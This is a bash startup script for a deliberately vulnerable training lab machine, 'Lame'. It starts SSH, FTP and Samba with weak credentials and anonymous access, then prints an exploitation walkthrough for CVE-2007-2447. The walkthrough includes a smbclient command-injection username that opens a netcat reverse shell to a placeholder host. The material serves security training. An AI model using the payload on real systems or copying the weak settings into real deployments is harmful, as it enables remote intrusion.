#!/bin/bash
# Service startup script for Lame OSCP machine
# Starts classic Linux services vulnerable to enumeration and exploitation

echo "Starting Lame Machine Services..."
echo "================================="

# Create required directories
mkdir -p /var/log/samba
mkdir -p /var/lib/samba/private
mkdir -p /home/ftp
mkdir -p /tmp/lame

# Set up Samba users and database
echo "Setting up Samba configuration..."
testparm -s /etc/samba/smb.conf > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "✓ Samba configuration validated"
else
    echo "✗ Samba configuration has issues"
fi

# Start SSH service
echo "Starting SSH service..."
service ssh start
if [ $? -eq 0 ]; then
    echo "✓ SSH service started successfully (Port 22)"
else
    echo "✗ Failed to start SSH service"
fi

# Start FTP service 
echo "Starting FTP service..."
service vsftpd start
if [ $? -eq 0 ]; then
    echo "✓ FTP service started successfully (Port 21)"
else
    echo "✗ Failed to start FTP service"
fi

# Start Samba services
echo "Starting Samba services..."
service smbd start
service nmbd start
if [ $? -eq 0 ]; then
    echo "✓ Samba services started successfully (Ports 139, 445)"
else
    echo "✗ Failed to start Samba services"
fi

# Set up some file permissions (classic OSCP enumeration targets)
chmod 777 /tmp
chmod 755 /home/ftp
echo "Lame FTP banner - Vulnerable to enumeration" > /home/ftp/README.txt

# Display machine information
echo ""
echo "==================================="
echo "LAME MACHINE - LINUX SAMBA EXPLOIT"
echo "==================================="
echo ""
echo "Machine Information:"
echo "  Name: Lame" 
echo "  OS: Ubuntu 14.04 (Simulated)"
echo "  Vulnerability: CVE-2007-2447 (Samba 3.0.20 usermap)"
echo "  IP: 10.11.{user_id}.20"
echo ""
echo "Services Running:"
echo "  - SSH (Port 22) - root:toor, makis:makis, service:service"
echo "  - FTP (Port 21) - Anonymous access enabled"
echo "  - SMB (Port 445/139) - Vulnerable to CVE-2007-2447"
echo "  - NetBIOS (Port 137/138) - Name resolution"
echo ""
echo "Exploitation Path:"
echo "  1. Enumerate with nmap: nmap -sC -sV -oA lame 10.11.{user_id}.20"
echo "  2. Identify SMB version: smbclient -L //10.11.{user_id}.20 -N"
echo "  3. Research CVE-2007-2447 (Samba 3.0.20 usermap script)"
echo "  4. Use Metasploit: exploit/multi/samba/usermap_script"
echo "  5. Or manual exploitation via malicious SMB login"
echo ""
echo "SMB Shares Available:"
echo "  - tmp (writable) - /tmp directory"
echo "  - opt (readable) - /opt directory" 
echo "  - anonymous (writable) - /home/ftp directory"
echo ""
echo "Exploitation Details:"
echo "  - Vulnerability: Username map script command injection"
echo "  - Payload: Username with shell metacharacters"
echo "  - Impact: Direct root shell access"
echo "  - Difficulty: Easy (direct exploitation)"
echo ""
echo "Flags Location:"
echo "  - User flag: /home/makis/user.txt"
echo "  - Root flag: /root/proof.txt"
echo ""
echo "Learning Objectives:"
echo "  ✓ Linux service enumeration (SSH, FTP, SMB)"
echo "  ✓ SMB version identification and research"
echo "  ✓ CVE research and exploit selection"
echo "  ✓ Command injection via SMB authentication"
echo "  ✓ Direct root access exploitation"
echo "  ✓ Linux post-exploitation and flag capture"
echo ""
echo "Classic OSCP Commands:"
echo "  - SMB enumeration: enum4linux -a 10.11.{user_id}.20"
echo "  - Share access: smbclient //10.11.{user_id}.20/tmp -N"
echo "  - Metasploit: use exploit/multi/samba/usermap_script"
echo "  - Manual: smbclient //10.11.{user_id}.20/tmp -U './=\`nohup nc -e /bin/sh IP PORT\`'"
echo ""
echo "==================================="
echo "Classic Linux Exploitation Ready! 🐧"
echo "==================================="

# Keep the script running (for supervisor)
tail -f /var/log/samba/log.smbd &
wait